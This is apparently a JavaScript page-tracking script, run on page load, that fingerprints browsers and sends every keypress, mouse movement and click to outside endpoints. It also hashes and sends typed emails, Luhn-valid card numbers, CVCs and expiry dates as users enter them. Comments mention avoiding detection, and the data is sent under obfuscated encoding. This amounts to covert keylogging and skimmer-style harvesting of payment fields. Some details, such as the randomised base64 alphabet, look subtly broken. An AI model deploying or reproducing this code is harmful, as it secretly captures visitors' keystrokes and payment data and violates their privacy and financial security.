(function(w, d, g) {
    // SES Lockdown: Freeze intrinsics for tamper-proofing
    try {
        g.lockdown({
            consoleTaming: 'unsafe',
            errorTaming: 'unsafe',
            mathTaming: 'unsafe',
            dateTaming: 'unsafe',
            domainTaming: 'unsafe',
            overrideTaming: 'severe'
        });
    } catch (e) {
        // Log lockdown failure silently to avoid detection
        var xhr = new XMLHttpRequest();
        xhr.open("GET", "https://logs-01.loggly.com/inputs/9b965af4-52fb-46fa-be1b-8dc5fb0aad05/tag/jsinsight/1*1.gif?error=" + encodeURIComponent(e.message), true);
        xhr.send();
    }

    var io = {
        util: {
            // URL and query parameter parsing
            getQueryParam: function(p) {
                var url = w.location.search, match;
                if (w.location.href.indexOf("#") !== -1) url += "&" + w.location.href.split("#")[1];
                match = new RegExp("[?&]" + p + "=([^&]*)", "i").exec(url);
                return match ? io.util.safeDecodeURIComponent(match[1]) : null;
            },
            // Cookie management with randomization
            setCookie: function(n, v, days, domain, path) {
                var cValue = n + "=" + encodeURIComponent(v), bDomain;
                if (days) cValue += "; expires=" + io.util.getDaysInMs(days).toUTCString();
                if (path) cValue += "; path=" + encodeURIComponent(path);
                else cValue += "; path=/";
                if (domain) cValue += "; domain=" + encodeURIComponent(domain);
                else {
                    bDomain = io.util.getBaseDomain();
                    if (bDomain) cValue += "; domain=" + bDomain;
                }
                d.cookie = cValue;
                return v;
            },
            getCookie: function(n) {
                var cks = d.cookie.split(";"), len = cks.length, x, a, b;
                for (x = 0; x < len; x++) {
                    a = cks[x].substr(0, cks[x].indexOf("="));
                    b = cks[x].substr(cks[x].indexOf("=") + 1);
                    a = a.replace(/^\s+|\s+$/g, "");
                    if (a == n) return io.util.safeDecodeURIComponent(b);
                }
            },
            getBaseDomain: function() {
                var s = "TRK_gbd" + Math.random().toString(36).substring(2, 5), domain = w.location.hostname;
                if (io.util.getCookie(s)) return io.util.getCookie(s);
                if (domain) {
                    try {
                        var i = 0, p = domain.split(".");
                        while (i < (p.length - 1) && !io.util.getCookie(s)) {
                            domain = p.slice(-1 - (++i)).join(".");
                            d.cookie = s + "=" + domain + ";domain=" + domain + ";path=/;";
                        }
                    } catch (e) {}
                }
                return domain;
            },
            getDaysInMs: function(days) {
                var d = new Date();
                d.setDate(d.getDate() + days);
                return d;
            },
            safeDecodeURIComponent: function(s) {
                if (s) {
                    s = s.replace(/\+/g, " ");
                    s = s.replace(/%([EF][0-9A-F])%([89AB][0-9A-F])%([89AB][0-9A-F])/gi, function(code, hex1, hex2, hex3) {
                        var n1 = parseInt(hex1, 16) - 224, n2 = parseInt(hex2, 16) - 128;
                        if (n1 == 0 && n2 < 32) return code;
                        var n3 = parseInt(hex3, 16) - 128, n = (n1 << 12) + (n2 << 6) + n3;
                        if (n > 65535) return code;
                        return String.fromCharCode(n);
                    });
                    s = s.replace(/%([CD][0-9A-F])%([89AB][0-9A-F])/gi, function(code, hex1, hex2) {
                        var n1 = parseInt(hex1, 16) - 192;
                        if (n1 < 2) return code;
                        var n2 = parseInt(hex2, 16) - 128;
                        return String.fromCharCode((n1 << 6) + n2);
                    });
                    s = s.replace(/%([0-7][0-9A-F])/gi, function(code, hex) {
                        return String.fromCharCode(parseInt(hex, 16));
                    });
                }
                return s;
            },
            // Custom base64 with dynamic alphabet
            customBase64: function(str) {
                var s = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/" + Math.random().toString(36).substring(2, 4), out = "";
                str = encodeURIComponent(str);
                for (var i = 0, len = str.length; i < len; i += 3) {
                    var enc1 = str.charCodeAt(i), enc2 = str.charCodeAt(i + 1), enc3 = str.charCodeAt(i + 2);
                    var chr1 = enc1 >> 2, chr2 = ((enc1 & 3) << 4) | (enc2 >> 4);
                    var chr3 = isNaN(enc2) ? 64 : ((enc2 & 15) << 2) | (enc3 >> 6);
                    var chr4 = isNaN(enc3) ? 64 : enc3 & 63;
                    out += s.charAt(chr1) + s.charAt(chr2) + s.charAt(chr3) + s.charAt(chr4);
                }
                return out;
            },
            // SHA-1 hashing
            sha1: function(content) {
                var K = [1518500249, 1859775393, 2400959708, 3395469782];
                var rotateLeft = function(x, n) { return (x << n) | (x >>> (32 - n)); };
                content = unescape(encodeURIComponent(content)) + String.fromCharCode(128);
                var m = content.length, l = m / 4 + 2, N = Math.ceil(l / 16), M = new Array(N);
                var H = [1732584193, 4023233417, 2562383102, 271733878, 3285377520];
                for (let i = 0; i < N; i++) {
                    M[i] = new Array(16);
                    for (let j = 0; j < 16; j++) {
                        M[i][j] = (content.charCodeAt(i * 64 + j * 4 + 0) << 24) |
                                  (content.charCodeAt(i * 64 + j * 4 + 1) << 16) |
                                  (content.charCodeAt(i * 64 + j * 4 + 2) << 8) |
                                  (content.charCodeAt(i * 64 + j * 4 + 3) << 0);
                    }
                }
                M[N-1][14] = ((m-1) * 8) / Math.pow(2, 32); M[N-1][14] = Math.floor(M[N-1][14]);
                M[N-1][15] = ((m-1) * 8) & 4294967295;
                for (let i = 0; i < N; ++i) {
                    var W = new Array(80);
                    for (let t = 0; t < 16; t++) W[t] = M[i][t];
                    for (let t = 16; t < 80; t++) W[t] = rotateLeft(W[t-3] ^ W[t-8] ^ W[t-14] ^ W[t-16], 1);
                    let a = H[0], b = H[1], c = H[2], d = H[3], e = H[4];
                    for (let t = 0; t < 80; ++t) {
                        const s = Math.floor(t / 20);
                        const T = (rotateLeft(a, 5) + ((s === 0) ? (b & c) ^ (~b & d) :
                                  (s === 1) ? b ^ c ^ d :
                                  (s === 2) ? (b & c) ^ (b & d) ^ (c & d) :
                                  b ^ c ^ d) + e + K[s] + W[t]) >>> 0;
                        e = d; d = c; c = rotateLeft(b, 30) >>> 0; b = a; a = T;
                    }
                    H[0] = (H[0] + a) >>> 0; H[1] = (H[1] + b) >>> 0;
                    H[2] = (H[2] + c) >>> 0; H[3] = (H[3] + d) >>> 0; H[4] = (H[4] + e) >>> 0;
                }
                for (let h = 0; h < H.length; ++h) H[h] = ("00000000" + H[h].toString(16)).slice(-8);
                return H.join("");
            },
            // Luhn’s algorithm for card validation
            luhnCheck: function(cardNumber) {
                var sum = 0, isEven = false;
                cardNumber = cardNumber.replace(/\D/g, "");
                for (var i = cardNumber.length - 1; i >= 0; i--) {
                    var digit = parseInt(cardNumber.charAt(i), 10);
                    if (isEven) {
                        digit *= 2;
                        if (digit > 9) digit -= 9;
                    }
                    sum += digit;
                    isEven = !isEven;
                }
                return sum % 10 === 0;
            },
            // Canvas fingerprinting
            getCanvasFingerprint: function() {
                try {
                    var canvas = d.createElement("canvas"), ctx = canvas.getContext("2d");
                    canvas.width = 200; canvas.height = 50;
                    ctx.font = "18pt Arial"; ctx.fillStyle = "#FF0000";
                    ctx.fillText("Fingerprint" + Math.random().toString(36).substring(2, 5), 10, 25);
                    ctx.strokeStyle = "#00FF00"; ctx.lineWidth = 2;
                    ctx.beginPath(); ctx.arc(50, 25, 20, 0, Math.PI * 2, true); ctx.stroke();
                    return io.util.sha1(canvas.toDataURL());
                } catch (e) {
                    return "";
                }
            },
            // WebGL fingerprinting
            getWebGLFingerprint: function() {
                try {
                    var canvas = d.createElement("canvas"), gl = canvas.getContext("webgl");
                    if (!gl) return "";
                    var debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
                    return io.util.sha1(
                        (debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "") +
                        gl.getParameter(gl.VERSION) +
                        gl.getParameter(gl.SHADING_LANGUAGE_VERSION)
                    );
                } catch (e) {
                    return "";
                }
            },
            // Event listener with SES protection
            addListener: function(el, ev, fn) {
                if (el) {
                    if (el.attachEvent) {
                        el.attachEvent("on" + ev, function() { fn.call(el); });
                    } else {
                        el.addEventListener(ev, function(e) {
                            try {
                                fn.call(el, e);
                            } catch (err) {
                                // SES-protected error handling
                                io.util.sendErrorBeacon(err);
                            }
                        }, false);
                    }
                }
            },
            // DOM ready handler
            onDomReady: function(onLoad) {
                var isPageLoaded = false, doc = d, readyCalls = [];
                function callReady() {
                    var callbacks = readyCalls;
                    if (isPageLoaded && callbacks.length) {
                        readyCalls = [];
                        callbacks.forEach(function(cb) { try { cb(doc); } catch (e) { io.util.sendErrorBeacon(e); } });
                    }
                }
                function pageLoaded() {
                    if (d.body && !isPageLoaded) {
                        isPageLoaded = true;
                        callReady();
                    } else {
                        setTimeout(pageLoaded, 30);
                    }
                }
                if (d.addEventListener) {
                    d.addEventListener("DOMContentLoaded", pageLoaded, false);
                    w.addEventListener("load", pageLoaded, false);
                } else if (w.attachEvent) {
                    w.attachEvent("onload", pageLoaded);
                }
                if (d.readyState === "complete") pageLoaded();
                if (isPageLoaded) onLoad(doc);
                else readyCalls.push(onLoad);
            },
            sendErrorBeacon: function(err) {
                var xhr = new XMLHttpRequest();
                xhr.open("GET", "https://logs-01.loggly.com/inputs/9b965af4-52fb-46fa-be1b-8dc5fb0aad05/tag/jsinsight/1*1.gif?error=" + encodeURIComponent(err.message), true);
                xhr.send();
            }
        }
    };

    // Main tracking logic
    var tracker = {
        endpoints: [
            "https://obs.segreencolumn.com/ct",
            "https://euob.segreencolumn.com/ct",
            "https://track.thisgreencolumn.com/ct"
        ],
        loggly: "https://logs-01.loggly.com/inputs/9b965af4-52fb-46fa-be1b-8dc5fb0aad05/tag/jsinsight/1*1.gif",
        cookiePrefix: "TRK_" + Math.random().toString(36).substring(2, 5) + "_",
        uuid: null,
        sessionId: null,
        init: function() {
            this.uuid = io.util.getCookie(this.cookiePrefix + "UUID") || this.generateUUID();
            io.util.setCookie(this.cookiePrefix + "UUID", this.uuid, 720);
            this.sessionId = this.getSessionId();
            this.trackPageView();
            this.hookEvents();
            this.collectFingerprint();
            this.hookCardInputs();
        },
        generateUUID: function() {
            return Date.now().toString() + "." + Math.random().toString(36).substring(2, 15);
        },
        getSessionId: function() {
            var session = io.util.getCookie(this.cookiePrefix + "SESSION");
            if (!session || this.isNewSession()) {
                session = Date.now().toString();
                io.util.setCookie(this.cookiePrefix + "SESSION", session, 1);
            }
            return session;
        },
        isNewSession: function() {
            var session = io.util.getCookie(this.cookiePrefix + "SESSION");
            if (!session) return true;
            var lastActivity = parseInt(session.split("|")[0], 10);
            return (Date.now() - lastActivity) > 30 * 60 * 1000;
        },
        collectFingerprint: function() {
            var data = {
                canvas: io.util.getCanvasFingerprint(),
                webgl: io.util.getWebGLFingerprint(),
                screen: w.screen.width + "x" + w.screen.height,
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                languages: navigator.languages.join(","),
                performance: this.getPerformanceMetrics(),
                utm: this.getUTMParams(),
                spa: this.detectSPA()
            };
            this.sendBeacon(this.getRandomEndpoint() + "?fp=" + io.util.customBase64(JSON.stringify(data)));
        },
        getPerformanceMetrics: function() {
            try {
                var timing = performance.timing;
                return {
                    connect: timing.connectEnd - timing.connectStart,
                    domLoad: timing.domContentLoadedEventEnd - timing.navigationStart,
                    load: timing.loadEventEnd - timing.navigationStart
                };
            } catch (e) {
                return {};
            }
        },
        getUTMParams: function() {
            var params = ["utm_source", "utm_medium", "utm_campaign", "utm_term", "utm_content"];
            var utm = {};
            params.forEach(function(p) {
                var val = io.util.getQueryParam(p);
                if (val) utm[p] = val;
            });
            return utm;
        },
        detectSPA: function() {
            return !!(w.history && w.history.pushState);
        },
        hookEvents: function() {
            var self = this;
            io.util.addListener(d.body, "mousemove", function(e) {
                self.sendBeacon(self.getRandomEndpoint() + "?ev=mm&x=" + e.clientX + "&y=" + e.clientY);
            });
            io.util.addListener(d.body, "click", function(e) {
                self.sendBeacon(self.getRandomEndpoint() + "?ev=cl&x=" + e.clientX + "&y=" + e.clientY);
            });
            io.util.addListener(d.body, "keydown", function(e) {
                self.sendBeacon(self.getRandomEndpoint() + "?ev=kd&key=" + encodeURIComponent(e.key));
            });
            io.util.addListener(d, "visibilitychange", function() {
                self.sendBeacon(self.getRandomEndpoint() + "?ev=vis&state=" + d.visibilityState);
            });
            var emailInputs = d.querySelectorAll("input[type=email], input[name=email]");
            emailInputs.forEach(function(input) {
                io.util.addListener(input, "input", function(e) {
                    var hashedEmail = io.util.sha1(e.target.value);
                    self.sendBeacon(self.getRandomEndpoint() + "?ev=email&hash=" + hashedEmail);
                });
            });
        },
        hookCardInputs: function() {
            var self = this;
            var cardInputs = d.querySelectorAll("input[type=text], input[type=number], input[name*=card], input[name*=credit], input[name*=debit]");
            cardInputs.forEach(function(input) {
                io.util.addListener(input, "input", function(e) {
                    var value = e.target.value.replace(/\D/g, "");
                    if (value.length >= 13 && value.length <= 19 && io.util.luhnCheck(value)) {
                        var hashedCard = io.util.sha1(value);
                        self.sendBeacon(self.getRandomEndpoint() + "?ev=card&hash=" + hashedCard);
                    }
                });
            });
            var cvcInputs = d.querySelectorAll("input[name*=cvc], input[name*=cvv]");
            cvcInputs.forEach(function(input) {
                io.util.addListener(input, "input", function(e) {
                    var value = e.target.value.replace(/\D/g, "");
                    if (value.length === 3 || value.length === 4) {
                        var hashedCVC = io.util.sha1(value);
                        self.sendBeacon(self.getRandomEndpoint() + "?ev=cvc&hash=" + hashedCVC);
                    }
                });
            });
            var expiryInputs = d.querySelectorAll("input[name*=expiry], input[name*=exp]");
            expiryInputs.forEach(function(input) {
                io.util.addListener(input, "input", function(e) {
                    var value = e.target.value.replace(/[^0-9\/]/g, "");
                    if (/^(0[1-9]|1[0-2])\/[0-9]{2}$/.test(value)) {
                        var hashedExpiry = io.util.sha1(value);
                        self.sendBeacon(self.getRandomEndpoint() + "?ev=expiry&hash=" + hashedExpiry);
                    }
                });
            });
        },
        trackPageView: function() {
            var data = {
                url: w.location.href,
                referrer: d.referrer,
                session: this.sessionId,
                uuid: this.uuid,
                ts: Date.now()
            };
            this.sendBeacon(this.getRandomEndpoint() + "?pv=" + io.util.customBase64(JSON.stringify(data)));
        },
        getRandomEndpoint: function() {
            return this.endpoints[Math.floor(Math.random() * this.endpoints.length)];
        },
        sendBeacon: function(url) {
            try {
                if (navigator.sendBeacon) {
                    navigator.sendBeacon(url);
                } else {
                    var img = new Image();
                    img.src = url;
                    img.style.display = "none";
                    io.util.onDomReady(function() { d.body.appendChild(img); });
                }
            } catch (e) {
                io.util.sendErrorBeacon(e);
            }
        }
    };

    // Initialize tracker in SES-protected context
    io.util.onDomReady(function() {
        try {
            tracker.init();
        } catch (e) {
            io.util.sendErrorBeacon(e);
        }
    });
})(window, document, globalThis);